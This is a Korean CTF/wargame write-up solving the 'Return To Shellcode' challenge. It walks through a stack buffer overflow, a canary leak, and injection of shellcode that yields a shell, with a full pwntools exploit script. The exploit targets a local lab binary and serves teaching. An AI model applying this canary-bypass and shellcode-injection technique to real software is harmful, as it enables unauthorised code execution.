Return To Shellcode 라이트업
===============


<img width="587" height="266" alt="image" src="https://github.com/user-attachments/assets/afd97a65-b219-4add-ba97-f085270dcf9d" />

checksec을 이용해 보호기법을 먼저 파악해볼 수 있다.

### 취약점 탐색

#### 1. buf의 주소

```c
printf("Address of the buf: %p\n", buf);
printf("Distance between buf and $rbp: %ld\n",
        (char*)__builtin_frame_address(0) - buf);
```

#### 2. 스택 버퍼 오버플로우

```c
char buf[0x50];

read(0, buf, 0x100);   // 0x50 < 0x100
gets(buf);             // Unsafe function
```

코드를 보면 스택 버퍼인 buf에 총 두 번의 입력을 받는데 두 입력 모두에서 오버플로우가 발생한다는 것을 알 수 있다.


### 익스플로잇 시나리오

#### 1. 카나리 우회

첫 번째 입력에서  buf에 오버플로우를 발생시켜 카나리를 구한다.

#### 2. 셸 획득

카나리를 구해서 두 번째 입력으로 반환 주소를 덮는다. get_shell() 함수가 없으므로 셸을 획득하는 코드를 직접 주입해야 한다.


### 익스플로잇

#### 1. 스택 프레임 정보 수집
스택을 이용하여 공격해야 하므로 스택 프레임의 구조를 먼저 파악해야 한다. 

```c
from pwn import *

def slog(n, m): return success(': '.join([n, hex(m)]))

p = process('./r2s')

context.arch = 'amd64'

p.recvuntil(b'buf: ')
buf = int(p.recvline()[:-1], 16)
slog('Address of buf', buf)

p.recvuntil(b'$rbp: ')
buf2sfp = int(p.recvline().split()[0])
buf2cnry = buf2sfp - 8
slog('buf <=> sfp', buf2sfp)
slog('buf <=> canary', buf2cnry)
```


#### 2. 카나리 릭

buf와 카나리 사이를 임의의 값으로 채우면 프로그램에서 buf를 출력할 때 카나리가 같이 출력된다, 

```c
payload = b'A'*(buf2cnry + 1) # (+1) because of the first null-byte

p.sendafter(b'Input:', payload)
p.recvuntil(payload)
cnry = u64(b'\x00'+p.recvn(7))
slog('Canary', cnry)
```

#### 3. 익스플로잇

카나리를 구했으므로 buf에 셸코드를 주입하고 카나리를 구한 값으로 덮은 뒤 반환 주소를 buf로 덮으면 셸코드가 실행되게 할 수 있다.

```c
sh = asm(shellcraft.sh())
payload = sh.ljust(buf2cnry, b'A') + p64(cnry) + b'B'*0x8 + p64(buf)
# gets() receives input until '\n' is received
p.sendlineafter(b'Input:', payload)

p.interactive()
```

<img width="677" height="182" alt="image" src="https://github.com/user-attachments/assets/4b218fdc-b210-4f4f-a17c-d06b96145417" />

공격에 성공해서 떴고 여기서 플래그 출력이 가능하다.



